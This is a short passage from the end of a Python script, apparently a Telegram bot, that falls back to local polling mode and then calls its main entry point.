    else:
        print("✅ Running in polling mode (Local)")
        app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()